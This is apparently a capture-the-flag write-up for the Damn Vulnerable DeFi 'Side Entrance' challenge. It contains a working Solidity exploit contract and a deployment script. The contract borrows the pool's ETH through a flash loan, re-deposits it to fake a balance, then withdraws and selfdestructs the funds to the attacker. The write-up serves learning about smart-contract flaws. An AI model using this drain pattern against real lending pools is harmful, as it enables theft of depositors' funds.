A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/side-entrance)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/side-entrance/side-entrance.challenge.js)
___
## Solution:
It is important to note that we can deposit the amount received after flash loan, thereby passing the necessary checks and at the same time, to get the necessary balance in the system. After that we can withdraw.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntrancePwn {
    address public attaker;
    ISideEntranceLenderPool public pool;
    constructor (address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        attaker = msg.sender;
    }
    function pwn() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value:msg.value}();
    }

    receive() external payable {
        selfdestruct(payable(attaker));
        // payable(attaker).send(address(this).balance);
    }
}
```

```js
pwn = await (await ethers.getContractFactory('SideEntrancePwn', player)).deploy(pool.address);

await pwn.pwn();
```
